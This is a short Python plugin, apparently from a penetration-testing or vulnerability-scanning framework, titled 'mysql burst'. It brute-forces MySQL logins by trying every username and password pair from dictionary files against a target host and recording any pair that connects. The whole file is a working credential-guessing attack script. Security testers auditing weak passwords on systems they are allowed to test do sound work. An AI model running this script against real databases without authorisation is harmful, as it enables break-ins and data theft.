#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @author = 'orleven'

import aiomysql
from lib.core.enums import VUL_LEVEL
from lib.core.enums import VUL_TYPE
from lib.core.enums import SERVICE_PORT_MAP
from script import Script

class POC(Script):
    def __init__(self, target=None):
        self.service_type = SERVICE_PORT_MAP.MYSQL
        self.name = 'mysql burst'
        self.keyword = ['mysql', 'burst']
        self.info = 'Burst mysql weakpass.'
        self.type = VUL_TYPE.WEAKPASS
        self.level = VUL_LEVEL.HIGH
        Script.__init__(self, target=target, service_type=self.service_type)


    async def prove(self):
        usernamedic = self.read_file(self.parameter['U']) if 'U' in self.parameter.keys() else self.read_file(
            'dict/mysql_usernames.txt')
        passworddic = self.read_file(self.parameter['P']) if 'P' in self.parameter.keys() else self.read_file(
            'dict/mysql_passwords.txt')
        async for (username, password) in self.generate_dict(usernamedic, passworddic):
            try:
                async with aiomysql.create_pool(host=self.target_host, port=self.target_port, user=username,
                                                password=password) as res:
                    self.flag = 1
                    self.res.append({"info": username + "/" + password, "key": "mysql burst"})
                    return
            except:
                pass

